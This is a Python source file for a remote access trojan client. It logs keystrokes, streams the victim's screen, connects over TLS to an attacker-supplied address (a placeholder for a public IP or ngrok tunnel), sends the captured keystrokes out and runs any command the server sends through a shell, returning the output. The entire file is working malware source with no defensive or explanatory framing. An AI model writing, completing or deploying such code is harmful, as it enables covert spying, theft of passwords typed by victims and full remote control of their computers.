import socket
import ssl
import subprocess
import asyncio
from vidstream import ScreenShareClient
from pynput.keyboard import Listener

key_log = ""

def on_press(key):
    """Function to log pressed keys."""
    global key_log
    try:
        key_log += str(key.char)  # Capture printable keys
    except AttributeError:
        key_log += f" [{key}] "  # Capture special keys

def start_keylogger():
    """Function to start the keylogger."""
    with Listener(on_press=on_press) as listener:
        listener.join()

async def send_keylog(client_socket):
    """Function to send logged keys to the server."""
    global key_log
    while True:
        if key_log:
            try:
                client_socket.send(f"[KEYLOG]: {key_log}".encode())
                key_log = ""
            except Exception as e:
                print(f"Error sending keylog: {e}")
                break
        await asyncio.sleep(1)

async def capture_screen_video():
    """Function to start streaming screen to the server."""
    try:
        screen_client = ScreenShareClient('0.0.0.0', 9999)
        screen_client.start_stream()
        print("[INFO] Screen sharing started on port 9999")
    except Exception as e:
        print(f"Screen capture error: {e}")

async def connect_to_server(host, port):
    """Main function to connect to the server securely and handle commands."""
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client = ssl.wrap_socket(client)
        client.connect((host, port))
        print("Connected to the server successfully.")

        asyncio.create_task(send_keylog(client))

        while True:
            command = client.recv(1024).decode()
            if command.lower() == "exit":
                break
            elif command.lower() == "screen":
                await capture_screen_video()
            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    client.send(output)
                except subprocess.CalledProcessError as e:
                    client.send(e.output)

    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    asyncio.run(connect_to_server("your-public-ip-or-ngrok-address", 8888))
